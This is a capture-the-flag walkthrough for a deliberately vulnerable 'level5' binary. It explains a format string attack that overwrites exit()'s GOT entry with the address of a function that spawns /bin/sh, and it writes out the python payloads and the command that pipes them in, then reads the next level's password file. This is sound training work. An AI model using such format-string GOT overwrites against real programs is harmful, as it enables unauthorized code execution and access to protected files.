# Level5 Walkthrough

## Analyzing the Program with GDB

1. **Disassemble the program functions**:
   Using the command `disas`, we found that the program uses three functions :
   - o : allocates 24bytes on the stack, then calls the function system that executes the function stored at 0x80485f0 (/bin/sh) then exits
   - n : allocates 516bytes on the stack, reads a maximum of 512bytes on stdin then uses printf to print the string red using fgets and exits
   - main : executes n()

## Running the program

1. **Execute the Program with the Correct Input**:  
   We ran the program with the following command:  
   ```bash
   ./level5
   ```
    The program is waiting for the user to insert an input, prints it back and then exits properly.

2. **Trying to overflow the RET value**
    The idea is to create an overflow on n() and to redirect its return adress to 0x080484a4 which is the on of o()

    As n() does not return but calls exit() instead, we have to find exit()'s address, which is : 0x8049838

    When n() will be called in the main(), o() will takeover and will execute the command /bin/sh which will allow us to read the password for the next level

    We will first use the Format String Attack to find where is the address of `exit` :
    python -c "print '\x38\x98\x04\x08' + '%x '*4" | ./level5
    We find : 
    8200 b7fd1ac0 b7ff37d0 8049838

    Then we use the same exploit to modify the adress of `exit` by the address of o()g, 134513824 is specific here as it represents the number of characters needed to make the written value equal to the address of o() :
    ```python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/exploit```
    ```cat /tmp/exploit - | ./level5```
    Once you're in the program, just check level6/.pass by running this command :
    ```cat /home/user/level6/.pass``` 

## Moving to level6

1. **Swith User to level6**:
    Run ```su level6```

2. **Authenticate with the Password**:
    We used the password we found.